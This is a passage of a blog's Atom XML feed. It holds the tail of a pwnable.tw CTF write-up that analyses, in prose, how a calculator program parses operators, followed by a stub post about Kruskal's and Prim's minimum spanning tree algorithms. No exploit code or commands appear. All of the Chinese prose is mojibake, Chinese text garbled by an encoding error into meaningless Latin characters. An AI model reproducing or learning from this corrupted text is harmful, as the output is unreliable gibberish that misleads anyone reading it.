alt="image.png"></p><p>æ¥ä¸‹æ¥é¦–å…ˆåˆ¤æ–­s[v7]æ˜¯å¦ä¸º0ï¼Œä¸º0åˆ™å°†è¿ç®—ç¬¦å­˜å…¥s[v7]ä¸­ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“å­—ç¬¦æ•°ç»„sæ˜¯ä¸“é—¨ç”¨æ¥å‚¨å­˜æ“ä½œç¬¦çš„</p><p>è‹¥s[v7]ä¸ä¸º0ï¼ˆå³ä»£è¡¨å…ˆå‰å·²ç»å‚¨å­˜äº†æ“ä½œç¬¦ï¼‰ï¼Œåˆ™åˆ†æƒ…å†µåˆ¤æ–­ï¼Œè‹¥a1+iä¸Šçš„æ“ä½œç¬¦ä¸º*&#x2F;%åˆ™å¯¹s[v7]è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­å…¶æ˜¯å¦ä¸º+æˆ–-ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™åº”è¯¥æ˜¯ä¸€ä¸ªé’ˆå¯¹è¿ç®—ç¬¦ä¼˜å…ˆçº§çš„åˆ¤æ–­</p><p>è‹¥s[v7]çš„ä¼˜å…ˆçº§ä½äºa1+iï¼Œåˆ™è¿›å…¥evalå‡½æ•°ï¼Œä¹‹åå°†a1+iä¸Šçš„æ“ä½œç¬¦èµ‹ç»™s[v7]ï¼Œevalä¼ å…¥çš„å‚æ•°ä¸ºa2ä¸s[v7]ï¼ŒåŒæ—¶æˆ‘ä»¬çŸ¥é“a2æ•°ç»„ä¸­å‚¨å­˜çš„æ˜¯éœ€è¦è¢«æˆ‘ä»¬è¿ç®—çš„æ•°</p><p>ä¼˜å…ˆçº§ç›¸åŒä¸”éƒ½ä¸ºé«˜ä¼˜å…ˆçº§åˆ™å°†æ“ä½œç¬¦å†å‹å…¥æ ˆä¸­ï¼Œéšåå›åˆ°å¾ªç¯å¼€å¤´</p><p>a1+iä¸ºä½ä¼˜å…ˆçº§ï¼ˆåŠ ä¸å‡ï¼‰æ—¶åˆ™è¿›å…¥evalå‡½æ•°ï¼Œå…ˆå¯¹s[v7]è¿›è¡Œè¿ç®—ï¼Œä¹‹ås[v7]å‡ºæ ˆå†å°†a1+iå…¥æ ˆ</p><p>è‹¥é‡åˆ°å­—ç¬¦ä¸²ç»“å°¾åˆ™è·³å‡ºå¾ªç¯</p><p>æˆ‘ä»¬è¿›evalå‡½æ•°é‡Œç®€å•çœ‹ä¸€ä¸‹</p><p><img src="https://i.loli.net/2020/09/01/PhLB26KCVqea5Zj.png" alt="image.png"></p><p>ç²—ç•¥çœ‹äº†ä¸€ä¸‹å¤§æ¦‚å¯ä»¥çŸ¥é“evalå‡½æ•°æ˜¯ç”¨æ¥è¿›è¡Œè¿ç®—çš„å‡½æ•°ï¼Œ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://pwnable.tw/&quot;&gt;pwnable.tw&lt;/a&gt;æ˜¯ä¸€ä¸ªä¸–ç•ŒèŒƒå›´å†…å¾ˆæœ‰åçš„pwné¢˜ç½‘ç«™ï¼Œä½œä¸ºä¸»æ”»pwnçš„CTFerï¼Œä¸Šé¢çš„é¢˜å¯¹æˆ‘è€Œè¨€è‡ªç„¶æ˜¯å¾ˆæœ‰å¿…è¦åšçš„ï¼ˆå½“ç„¶æˆ‘ç°åœ¨è¿˜å¤ªå¼±äº†XD&lt;/p&gt;
&lt;p&gt;ç‚¹å¼€æŸ¥çœ‹é¢˜è§£ğŸ‘‡ï¼ˆ&lt;del&gt;å½“ç„¶ä¹Ÿæœ‰å¯èƒ½æˆ‘æš‚æ—¶è¿˜ä¸€é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥2333&lt;/del&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2shellcode" scheme="http://archive.next.arttnba3.cn/tags/ret2shellcode/"/>
    
  </entry>
  
  <entry>
    <title>ã€ç®—æ³•æµ…æ-0x03ã€‘æ±‚æœ€å°ç”Ÿæˆæ ‘â€”â€”Kruskalç®—æ³•ä¸Primç®—æ³•æµ…æ by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/05/19/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x03%E3%80%91%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E2%80%94%E2%80%94Kruskal%E7%AE%97%E6%B3%95%E4%B8%8EPrim%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/05/19/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x03%E3%80%91%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E2%80%94%E2%80%94Kruskal%E7%AE%97%E6%B3%95%E4%B8%8EPrim%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/</id>
    <published>2020-05-19T04:11:27.000Z</published>
    <updated>2020-09-05T11:40:14.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00 ç»ªè®º"></a>0x00 ç»ªè®º</h1><p><strong>Kruskalç®—æ³•ä¸Primç®—æ³•</strong>æ˜¯è¾ƒä¸ºå¸¸ç”¨çš„ç”¨æ¥<strong>æŸ¥æ‰¾æœ€å°ç”Ÿæˆæ ‘</strong>çš„ç®—æ³•ï¼Œåˆšå¥½ä»Šå¤©ä¸Šç¦»æ•£æ•°å­¦è¯¾çš„æ—¶å€™è®²åˆ°äº†æœ€å°ç”Ÿæˆæ ‘ï¼Œæ‰€ä»¥ä½œä¸ºä¸€åè’Ÿè’»å‰OIerå’±ä»Šå¤©ä¹Ÿæ¥ç®€å•è®²è®²XD</p><span id="more"></span><h1 id="0x01-ç”Ÿæˆæ ‘-amp-æœ€å°ç”Ÿæˆæ ‘"><a href="#0x01-ç”Ÿæˆæ ‘-amp-æœ€å°ç”Ÿæˆæ ‘" class="headerlink" title="0x01 ç”Ÿæˆæ ‘&amp;æœ€å°ç”Ÿæˆæ ‘"></a>0x01 ç”Ÿæˆæ ‘&amp;æœ€å°ç”Ÿæˆæ ‘</h1><blockquote><p>å…ˆå’•å’•å’•ç€ï¼Œæœ‰æ—¶é—´å¿…å†™</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç»ªè®º&quot;&gt;&lt;/a&gt;0x00 ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Kruskalç®—æ³•ä¸Primç®—æ³•&lt;/strong&gt;æ˜¯è¾ƒä¸ºå¸¸ç”¨çš„ç”¨æ¥&lt;strong&gt;æŸ¥æ‰¾æœ€å°ç”Ÿæˆæ ‘&lt;/strong&gt;çš„ç®—æ³•ï¼Œåˆšå¥½ä»Šå¤©ä¸Šç¦»æ•£æ•°å­¦è¯¾çš„æ—¶å€™è®²åˆ°äº†æœ€å°ç”Ÿæˆæ ‘ï¼Œæ‰€ä»¥ä½œä¸ºä¸€åè’Ÿè’»å‰OIerå’±ä»Šå¤©ä¹Ÿæ¥ç®€å•è®²è®²XD&lt;/p&gt;</summary>
    
    
    
    <category term="ç®—æ³•æµ…æ" scheme="http://archive.next.arttnba3.cn/categories/%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    
    
    <category term="ç®—æ³•" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="å›¾è®º" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
  </entry>
  
</feed>
